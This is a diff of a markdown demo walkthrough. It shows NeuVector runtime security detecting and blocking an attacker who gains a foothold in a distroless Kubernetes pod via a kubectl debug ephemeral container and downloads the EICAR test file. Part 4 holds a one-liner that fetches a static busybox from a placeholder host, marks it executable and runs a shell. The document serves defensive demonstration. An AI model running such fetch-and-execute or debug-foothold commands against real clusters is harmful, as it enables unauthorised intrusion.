@@ -1,20 +1,49 @@
-# SUSE Security (NeuVector) Demo Walkthrough: Distroless Containers
+# SUSE Security (NeuVector) Walkthrough — Distroless (`wheatley`)
 
 ## Status
 
-Narrative draft — not yet built. Hand this to Claude Code to generate the Dockerfile, app source, K8s manifests, and deploy script. Companion to `Security_Demo.md` (the `chell-test`/`aperture-sci` walkthrough) — that demo uses `nicolaka/netshoot`, a fully-loaded shell image. This one deliberately uses a **true distroless image** (no shell, no package manager, no coreutils) to show a different angle: what happens when the "exec in and run tools" attack path is closed at the image layer, and how SUSE Security still catches an attacker who works around that.
+Built and reconciled against [`PLAN.md`](./PLAN.md) Chamber 05 (+ the Chamber 07
+stretch) and against the repo's real files:
+[`apps/wheatley/`](../apps/wheatley/),
+[`manifests/aperture-labs/wheatley.yaml`](../manifests/aperture-labs/wheatley.yaml),
+[`Scripts/31_deploy_distroless.sh`](../Scripts/31_deploy_distroless.sh). Commands
+use the real object names (`wheatley`, `aperture-labs`, group
+`nv.wheatley.aperture-labs`).
 
-TODO once built: confirm exact wording/tab names for the ephemeral-container event in Notifications → Security Events (may vary by NeuVector version) — same "tighten up what you click on" caveat as the original doc.
+**Live-test TODO (NeuVector 5.4.x):** confirm the exact
+**Notifications → Security Events** wording for an ephemeral container attaching
+to a pod (the `kubectl debug` step) — it varies by version and may not be its
+own event type.
+
+---
 
 ## Overview
 
-This walkthrough uses a minimal, distroless "small web server" workload (`wheatley`) in a new namespace (`aperture-labs`) to demonstrate:
+The companion to [`Security_Demo.md`](./Security_Demo.md). That track uses
+`nicolaka/netshoot`, a fully-loaded shell image. This one uses a **true
+distroless image** — no shell, no package manager, no coreutils — to make a
+different point:
 
-1. Deploying a distroless container and confirming it works as a normal web service.
-2. Why `kubectl exec` straight into it fails outright — there is no shell to run — and how you actually get a foothold anyway (`kubectl debug` ephemeral container), which is the real-world technique attackers and admins both use against shell-less images.
-3. Pulling a resource from the internet that resembles malware/a vulnerability payload, first in **Monitor** mode (logged, not blocked), then in **Protect** mode (blocked/killed).
+1. Deploy a distroless container and confirm it is an ordinary web service.
+2. Show why `kubectl exec` straight into it fails at the **image layer** — there
+   is no shell — and how an attacker (or an admin) gets a foothold anyway with a
+   `kubectl debug` ephemeral container.
+3. Pull an internet resource that reads as a malware payload — first in
+   **Monitor** (logged, not blocked), then in **Protect** (blocked / killed).
 
-The conceptual "why" — how attackers pivot inside a shell-less container and where runtime enforcement fits — lives in [`Security_Discussion.md`](./Security_Discussion.md). This doc is the hands-on counterpart: it walks through one such path (attach tooling via `kubectl debug`, then reach out to the internet) and shows SUSE Security catching it at runtime, regardless of how minimal the image is.
+Parts 1–3 are **Chamber 05**; Part 4 is the **Chamber 07** stretch. Threat-model
+background: [`Security_Discussion.md`](./Security_Discussion.md).
+
+| Part | Chamber | Proves ([`PLAN.md`](./PLAN.md) §1) |
+|------|---------|------------------------------------|
+| 1 | 05 — deploy / Discover | **F** — image hardening is a *first* layer, not a substitute |
+| 2 | 05 — Monitor | **A, G** — the attached tooling and its egress are seen and logged |
+| 3 | 05 — Protect | **A, C, F** — runtime enforcement kills what image hardening can't |
+| 4 | 07 — Bring Your Own Land *(stretch)* | **A** — file + process monitoring catch dropped tooling |
+
+> 🎯 **Key framing:** keep two questions separate. Whether `kubectl debug` should
+> be allowed against production pods is **cluster RBAC's** job. What a debug
+> session can *do* once attached is **SUSE Security's** job.
 
 ---
 
@@ -22,234 +51,273 @@ The conceptual "why" — how attackers pivot inside a shell-less container and w
 
 ### The app: `wheatley`
 
-A tiny statically-linked Go HTTP server (`wheatley-server`), built multi-stage:
+A tiny statically-linked Go HTTP server —
+[`apps/wheatley/main.go`](../apps/wheatley/main.go), built multi-stage by
+[`apps/wheatley/Dockerfile`](../apps/wheatley/Dockerfile) onto
+`gcr.io/distroless/static-debian12:nonroot`. One binary, one process, no
+forking, no shelling out:
 
-```
-# builder stage
-FROM golang:1.22-alpine AS build
-WORKDIR /src
-COPY main.go .
-RUN CGO_ENABLED=0 GOOS=linux go build -o wheatley-server main.go
+- `GET /` → `I am NOT a moron... but I might be a tiny bit thick.`
+- `GET /healthz` → `200 OK` (the probe target)
+- makes **no** outbound connections
 
-# final stage — true distroless, no shell, no package manager
-FROM gcr.io/distroless/static-debian12:nonroot
-COPY --from=build /src/wheatley-server /wheatley-server
-EXPOSE 8080
-ENTRYPOINT ["/wheatley-server"]
-```
+That is the whole point: the learned baseline is "listen on 8080, serve HTTP,
+talk to nobody", so every step below is unmistakably off-baseline.
 
-`main.go` just needs to serve something Portal-flavored on `:8080`, e.g. `GET /` → `"I am NOT a moron... but I might be a tiny bit thick."` and `GET /healthz` → `200 OK`. Keep it to one binary, one process, no forking, no shelling out — that's what makes the learned baseline so tight and the demo so clean.
+### Deploy
 
-Push the image to whatever registry the cluster can pull from (Harbor/local registry per the homelab setup).
-
-### The manifest
-
-```yaml
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: aperture-labs
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: wheatley
-  namespace: aperture-labs
-  labels:
-    app: wheatley
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: wheatley
-  template:
-    metadata:
-      labels:
-        app: wheatley
-    spec:
-      containers:
-        - name: wheatley
-          image: <your-registry>/wheatley-server:latest
-          ports:
-            - containerPort: 8080
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: wheatley
-  namespace: aperture-labs
-spec:
-  selector:
-    app: wheatley
-  ports:
-    - port: 8080
-      targetPort: 8080
+```bash
+Scripts/31_deploy_distroless.sh
 ```
 
-No `shareProcessNamespace`, no debug sidecar baked in — the pod is exactly as minimal as it looks. That's deliberate; the "how do you get in" step below only works because Kubernetes gives you a side door that doesn't require the image to cooperate.
+builds the image, makes it visible to the cluster (local containerd load by
+default; pushes to `$REGISTRY` if you set one — see
+[`Scripts/lib/common.sh`](../Scripts/lib/common.sh) `build_image` / `push_image`),
+and applies
+[`manifests/aperture-labs/wheatley.yaml`](../manifests/aperture-labs/wheatley.yaml).
+The image reference comes from `$DISTROLESS_APP_IMAGE` in `env.sh` — no literal
+registry in the manifest.
 
-Suggested script name for Claude Code to produce: `Scripts/31_deploy_distroless.sh`, following the same pattern as `30_deploy_apps.sh` (source `env.sh`, apply the manifest, print next steps).
+The pod has **no** `shareProcessNamespace` and **no** debug sidecar — it is
+exactly as minimal as it looks. The foothold in Part 2 works only because
+Kubernetes itself provides a side door.
 
 ---
 
-## Part 0: Deploy and Confirm It's a Real Web Server
+## Part 1 — Deploy and confirm it's a real web server
 
-```
-kubectl apply -f wheatley.yaml
+### Step 1 — Confirm the service works
+
+```bash
 kubectl get pods -n aperture-labs
+```
+```
+NAME                        READY   STATUS    RESTARTS   AGE
+wheatley-7d9f6c5b8c-abcde   1/1     Running   0          2m
+```
+
+```bash
 kubectl port-forward -n aperture-labs svc/wheatley 8080:8080 &
 curl localhost:8080/
 ```
+```
+I am NOT a moron... but I might be a tiny bit thick.
+```
 
-You should get the Portal-flavored response back. This proves it's a working app before anyone tries to break it — worth a beat with the audience: "this is a fully functional web server. It just happens to contain nothing an attacker could use if they got inside it."
+> 🎯 **Key talking point:** This is a fully functional web server. It just
+> happens to contain nothing an attacker could use if they got inside it.
 
-Let it run for a couple of minutes untouched. In NeuVector, this is the group's **Discover** phase — it's learning that `wheatley`'s only normal behavior is: one process, listening on 8080, no outbound connections. That tight baseline is what makes every subsequent step obviously anomalous.
+### Step 2 — Let it learn, and confirm the group is in Discover
+
+Leave it untouched for a few minutes. **Policy → Groups →
+`nv.wheatley.aperture-labs`** starts in **Discover**. The baseline it builds is:
+one process, listening on 8080, no outbound connections.
 
 ---
 
-## Part 1: Observing in Monitor Mode
+## Part 2 — Observing in Monitor mode
 
-### Step 1 — Find the group and set it to Monitor
+### Step 3 — Set the group to Monitor
 
-**Policy → Groups** → find `nv.wheatley.aperture-labs` (or however it's auto-named). Set **Policy Mode** to **Monitor**.
+**Policy → Groups → `nv.wheatley.aperture-labs` → Policy Mode → Monitor.**
 
-> 🎯 **Key talking point:** Same three modes as the last demo — Discover, Monitor, Protect. Nothing new about the mechanism. What's different this time is the *workload*.
+> 🎯 **Key talking point:** Same three modes as the fat-image demo — Discover,
+> Monitor, Protect. Nothing new about the mechanism. What's different is the
+> *workload*.
 
-### Step 2 — Try the obvious thing: `kubectl exec`
+### Step 4 — Try the obvious thing: `kubectl exec`
 
+```bash
+kubectl exec -it -n aperture-labs deploy/wheatley -- /bin/sh
 ```
-kubectl exec -it -n aperture-labs $(kubectl get pods -n aperture-labs -o custom-columns=":metadata.name" --no-headers) -- /bin/sh
 ```
-
-Expected result:
-
-```
-OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/sh": stat /bin/sh: no such file or directory: unknown
-```
-
-> 🎯 **Key talking point:** This isn't NeuVector — this is the image itself. There is no shell binary in this container, full stop. Compare this to the `chell-test` demo, where `/bin/sh` and `/bin/bash` both exist and NeuVector has to kill the resulting process after the fact. Here, the attack surface is gone *before* SUSE Security ever gets involved. This is defense in depth: harden the image first, then let runtime security catch what image hardening can't.
-
-### Step 3 — Get in anyway: `kubectl debug`
-
-This is the realistic move — for an attacker with `exec`/`debug` RBAC permissions, or an admin troubleshooting a shell-less pod:
-
-```
-kubectl debug -it -n aperture-labs \
-  $(kubectl get pods -n aperture-labs -o custom-columns=":metadata.name" --no-headers) \
-  --image=busybox:1.36 \
-  --target=wheatley
+OCI runtime exec failed: exec failed: unable to start container process:
+exec: "/bin/sh": stat /bin/sh: no such file or directory: unknown
 ```
 
-This attaches an **ephemeral container** to the running pod. It shares the pod's network namespace (always) and, on most CRI runtimes, the target container's process namespace too — so from inside it, `ps` will show `wheatley`'s process. You now have a shell, tools, and a network path that the original image never provided.
+> 🎯 **Key talking point:** This isn't NeuVector — this is the image. There is no
+> shell binary, full stop. In the `chell-test` demo, `/bin/sh` exists and
+> NeuVector has to kill it after the fact. Here the attack surface is gone
+> *before* runtime security is involved. That's defense in depth: harden the
+> image, *then* let runtime security catch what hardening can't.
 
-> 🎯 **Key talking point:** Removing the shell from the image doesn't remove the side door Kubernetes itself provides. This is exactly the kind of technique real attackers use against hardened/distroless containers — and exactly why runtime security still matters even when you've done everything right at the image layer.
+### Step 5 — Get in anyway: `kubectl debug`
 
-Check Notifications → Security Events — depending on version/config, you may see an event logged for the new/unrecognized container attaching to the pod. Note it, but don't oversell it — the real enforcement moment is next.
+The realistic move for anyone with `debug` RBAC — attacker or admin:
 
-### Step 4 — Pull something that resembles a vulnerability payload
-
-From inside the `busybox` debug shell:
-
+```bash
+kubectl debug -it -n aperture-labs deploy/wheatley \
+  --image=busybox:1.36 --target=wheatley
 ```
+
+This attaches an **ephemeral container**. It shares the pod's network namespace
+(always) and, on most CRI runtimes, the target's process namespace — so `ps`
+inside it shows `wheatley`'s process. You now have a shell, tools, and a network
+path the original image never provided.
+
+Check **Notifications → Security Events** — depending on version you may see an
+event for the new container attaching. Note it, don't oversell it — the
+enforcement moment is Part 3.
+
+### Step 6 — Pull something that resembles a payload
+
+From inside the busybox debug shell:
+
+```sh
 wget -O /tmp/eicar.txt https://secure.eicar.org/eicar.com.txt
 cat /tmp/eicar.txt
 ```
 
-The EICAR string is the industry-standard, completely harmless "test virus" every AV/EDR vendor recognizes — safe to actually download live in a demo, and it universally reads as "this is what a malicious payload looks like" to the audience without anyone needing to explain what it is.
+The EICAR string is the harmless industry-standard "test virus" every AV/EDR
+recognises — safe to download live, and it reads to any audience as "this is
+what a payload looks like".
 
-Expected result in Monitor mode: **it works.** The file downloads.
+**Monitor-mode result: it works.** The file downloads.
 
-Refresh **Notifications → Security Events**. You should now see violation entries logged for:
-- An unrecognized process (`wget`, `sh`/`busybox`) never part of the learned baseline
-- An outbound connection to `secure.eicar.org`, a destination never part of the learned baseline
+**Notifications → Security Events** now shows, unblocked:
 
-Nothing blocked yet — that's Monitor mode.
+- an unrecognised process (`wget` / `sh` / `busybox`) — never in the baseline
+- an outbound connection to `secure.eicar.org` — never in the baseline
 
-> 🎯 **Key talking point:** SUSE Security saw all of it — the shell, the tool, the destination — and logged every step, even though the connection succeeded. Your security team has full visibility into an attempted foothold before you've enforced anything.
+> 🎯 **Key talking point:** SUSE Security saw all of it — the shell, the tool,
+> the destination — and logged every step, even though the download succeeded.
+> Full visibility into an attempted foothold before you've enforced anything.
 
 ---
 
-## Part 2: Switching to Protect Mode
+## Part 3 — Enforcement in Protect mode
 
-### Step 5 — Flip the group
+### Step 7 — Flip the group, confirm the app is unaffected
 
-**Policy → Groups** → `nv.wheatley.aperture-labs` → **Policy Mode** → **Protect** → confirm.
+**Policy → Groups → `nv.wheatley.aperture-labs` → Policy Mode → Protect →
+confirm.**
 
-> 🎯 **Key talking point:** Same granularity point as before — `wheatley` can be in Protect while other workloads in the cluster stay in Discover or Monitor. This is a per-workload dial, not an all-or-nothing switch.
-
-### Step 6 — Confirm the app itself is unaffected
-
-```
+```bash
 curl localhost:8080/
 ```
-
-Still works — the learned baseline (listen on 8080, serve HTTP) is exactly what Protect mode allows. Nothing about the app's real behavior changes.
-
----
-
-## Part 3: Enforcement
-
-### Step 7 — Try to get back in
-
 ```
-kubectl debug -it -n aperture-labs \
-  $(kubectl get pods -n aperture-labs -o custom-columns=":metadata.name" --no-headers) \
-  --image=busybox:1.36 \
-  --target=wheatley
+I am NOT a moron... but I might be a tiny bit thick.
 ```
 
-Kubernetes will still let you *attach* the ephemeral container — that's a cluster RBAC/admission decision, not something SUSE Security governs. But watch what happens the moment it tries to do anything:
+Still works — listen-on-8080 / serve-HTTP is the whole learned baseline, and
+that is exactly what Protect allows.
 
+> 🎯 **Key talking point:** `wheatley` can be in Protect while other workloads
+> stay in Discover or Monitor. Per-workload dial, not an all-or-nothing switch.
+
+### Step 8 — Try to get back in
+
+```bash
+kubectl debug -it -n aperture-labs deploy/wheatley \
+  --image=busybox:1.36 --target=wheatley
 ```
+
+Kubernetes still lets you **attach** — that's an RBAC/admission decision, not
+NeuVector's. But the moment it does anything:
+
+```sh
 ps aux
 ```
-
-or just the shell prompt itself may terminate — expect a `command terminated with exit code 137` pattern, the same SIGKILL signature seen in the `chell-test` demo. NeuVector's enforcement engine is killing the unrecognized process the instant it runs, because nothing about `busybox`/`sh` was ever part of `wheatley`'s learned baseline.
-
-> 🎯 **Key talking point:** This is the layered-defense story in one line: Kubernetes RBAC decides *who* can attach a debug container — that's a cluster-admin/policy question, not NeuVector's job. SUSE Security decides what that debug container is *allowed to do* once it's there — and the answer, in Protect mode, is nothing outside the learned baseline.
-
-If the shell survives long enough to issue a command, retry the exact Part 1 sequence:
-
 ```
+command terminated with exit code 137
+```
+
+The shell may drop the instant it starts. `137` = SIGKILL — the Enforcer kills
+the unrecognised `busybox` / `sh` process the moment it runs, because none of it
+was ever in `wheatley`'s baseline.
+
+If the shell survives long enough, retry Step 6:
+
+```sh
 wget -O /tmp/eicar.txt https://secure.eicar.org/eicar.com.txt
 ```
 
-Expected result: blocked — connection refused/reset, or the process killed outright, mirroring the `curl google.com` moment from the original demo. Refresh **Notifications → Security Events** — you should see **Deny**/**Denied** entries for both the process and the network connection, timestamped to this attempt.
+Blocked — connection reset, or the process killed outright. **Security Events**
+shows **Deny** entries for both the process and the network connection,
+timestamped to this attempt.
 
-> 🎯 **Key talking point:** Same enforcement engine, same behavioral model, just applied to a workload with a dramatically smaller attack surface to begin with. The lesson for the audience: distroless is a great first layer, but "no shell in the image" and "no runtime enforcement" are two different guarantees. You want both.
+> 🎯 **Key talking point:** Same enforcement engine, same behavioural model, just
+> applied to a workload with a far smaller attack surface to begin with.
+> "No shell in the image" and "no runtime enforcement" are two different
+> guarantees — you want both.
 
-### Step 8 — Optional: rewrite-rule dance
+### Step 9 — Optional: make the baseline durable policy
 
-If you want to echo the original demo's granularity beat, click **Rewrite Rule** on one of the violations, review the warning, **Deploy**, and show that `wheatley`'s baseline is now durable policy independent of the image — you could swap the image entirely and the rule would still apply to anything matching that group's identity.
+Click **Rewrite Rule** on one of the violations, review the warning, **Deploy**.
+`wheatley`'s baseline is now explicit policy tied to the group's identity — swap
+the image entirely and the rule still applies to anything matching that group.
+
+---
+
+## Part 4 — Chamber 07 (stretch): Bring Your Own Land
+
+A short bolt-on to Chamber 05. Instead of running tooling from the debug
+container directly, an attacker exploiting a file-write flaw drops a
+statically-linked binary into a writable path and executes it via the app — the
+missing OS libraries don't matter because the binary carries its own.
+
+From the debug shell (Monitor, then Protect):
+
+```sh
+wget -O /tmp/land https://<host>/static-busybox && chmod +x /tmp/land && /tmp/land sh
+```
+
+- **File-system monitoring** flags the write to `/tmp`.
+- **Process profiling** flags `/tmp/land` executing — not in the allow-list — and
+  blocks it in Protect.
+
+Full technique catalogue and the other shell-less pivots:
+[`Security_Discussion.md`](./Security_Discussion.md) → "Bring Your Own Land".
+
+> This Part is not yet scripted or hardened for a live run — treat it as a
+> narrated extension until it graduates to its own chamber (see
+> [`PLAN.md`](./PLAN.md) §3, Chamber 07).
 
 ---
 
 ## Demo Summary
 
 | Action | Mode | Result |
-| --- | --- | --- |
-| `curl localhost:8080/` | Discover/Monitor/Protect | ✅ Allowed — matches learned baseline throughout |
-| `kubectl exec -- /bin/sh` | any | 🚫 Fails immediately — no shell in the image (not NeuVector; image hardening) |
-| `kubectl debug --target=wheatley` (attach busybox) | Monitor | ✅ Attaches — logged as unrecognized process/container |
-| `wget eicar.com.txt` (via debug shell) | Monitor | ✅ Succeeds — logged as process + network anomaly, not blocked |
-| `kubectl debug --target=wheatley` (attach busybox) | Protect | ⚠️ Still attaches (K8s RBAC territory) — but anything it runs is immediately killed |
-| `wget eicar.com.txt` (via debug shell) | Protect | 🚫 Blocked/killed — process + network violation enforced |
+|--------|------|--------|
+| `curl localhost:8080/` | Discover / Monitor / Protect | ✅ Allowed throughout — matches the baseline |
+| `kubectl exec -- /bin/sh` | any | 🚫 Fails immediately — no shell in the image (image hardening, not NeuVector) |
+| `kubectl debug --target=wheatley` (attach busybox) | Monitor | ✅ Attaches — logged as an unrecognised process/container |
+| `wget eicar.com.txt` (via debug shell) | Monitor | ✅ Succeeds — logged as process + network anomaly |
+| `kubectl debug --target=wheatley` (attach busybox) | Protect | ⚠️ Still attaches (K8s RBAC) — but anything it runs is SIGKILLed |
+| `wget eicar.com.txt` (via debug shell) | Protect | 🚫 Blocked / killed — process + network violation enforced |
+| drop + run `/tmp/land` *(Chamber 07)* | Protect | 🚫 Blocked — filesystem-write + process-profile violation |
 
 ---
 
-## Key Takeaways for Your Audience
+## Key Takeaways
 
-Distroless closed the "exec in and use built-in tools" path — that's why `kubectl exec` failed outright. It did nothing to stop tooling being *attached* to the pod via Kubernetes itself, and nothing to patch the app. SUSE Security is what caught the attached tooling and its egress at runtime, using the same Discover → Monitor → Protect behavioral model as the `chell-test` demo — proving the control is about *behavior*, not about trusting the image to police itself. And keep the two questions separate: whether `kubectl debug` should be allowed against production pods at all is cluster RBAC's job; what that debug session is allowed to *do* once attached is SUSE Security's — it's the sophisticated point that separates this demo from a simple "look, it blocks stuff" pitch.
-
-For the broader threat picture behind this demo — the full set of pivots a shell-less container is still exposed to — see [`Security_Discussion.md`](./Security_Discussion.md).
+- **Image hardening and runtime enforcement are complementary** *(claim F)* —
+  distroless closed the "exec in and use built-in tools" path, which is why
+  `kubectl exec` failed outright. It did nothing about tooling *attached* via
+  Kubernetes, and nothing about the app's own vulnerabilities.
+- **Behavioural, regardless of the image** *(claim A)* — NeuVector caught the
+  attached tooling and its egress with the same Discover → Monitor → Protect
+  model as the fat-image demo. The control is about *behaviour*, not about
+  trusting the image to police itself.
+- **RBAC vs. runtime** *(claim C)* — whether `kubectl debug` is allowed at all is
+  cluster RBAC; what the debug session may *do* once attached is SUSE Security.
+- **Full audit trail** *(claim G)* — every step of the foothold was logged in
+  Monitor before anything was enforced.
 
 ---
 
 ## References
 
-- Kubernetes — [Debug Running Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/) — `kubectl debug`, ephemeral containers, and `--target` (the foothold technique in Part 1).
-- GoogleContainerTools — [distroless](https://github.com/GoogleContainerTools/distroless) — the base-image family used for `wheatley` (`gcr.io/distroless/static-debian12:nonroot`), plus the `:debug` shell variants.
-- NeuVector Docs — [Modes: Discover, Monitor, Protect](https://open-docs.neuvector.com/policy/modes/) and [Process Profile Rules](https://open-docs.neuvector.com/policy/processrules/) — the runtime enforcement that still catches the attached tooling.
-- EICAR — [Download Anti-Malware Testfile](https://www.eicar.org/download-anti-malware-testfile/) — the harmless standard test payload pulled in Step 4.
+- [`PLAN.md`](./PLAN.md) — thesis, claims A–G, chamber list (Chamber 05 + 07).
+- [`00-glossary.md`](./00-glossary.md) — ephemeral container, EICAR, Discover /
+  Monitor / Protect, and every other term used here.
+- Kubernetes — [Debug Running Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
+  — `kubectl debug`, ephemeral containers, `--target`.
+- GoogleContainerTools — [distroless](https://github.com/GoogleContainerTools/distroless)
+  — what `gcr.io/distroless/static-debian12:nonroot` removes and what it leaves.
+- NeuVector Docs — [Modes: Discover, Monitor, Protect](https://open-docs.neuvector.com/policy/modes/)
+  · [Process Profile Rules](https://open-docs.neuvector.com/policy/processrules/)
+- EICAR — [Anti-Malware Testfile](https://www.eicar.org/download-anti-malware-testfile/).
 - SUSE Communities — [Zero Trust Runtime Container Security](https://www.suse.com/c/zero-trust-runtime-container-security/)
-- Related: [`Security_Demo.md`](./Security_Demo.md) (the `chell-test` walkthrough) · [`Security_Discussion.md`](./Security_Discussion.md)
+- Companion: [`Security_Demo.md`](./Security_Demo.md) ·
+  [`Security_Discussion.md`](./Security_Discussion.md)
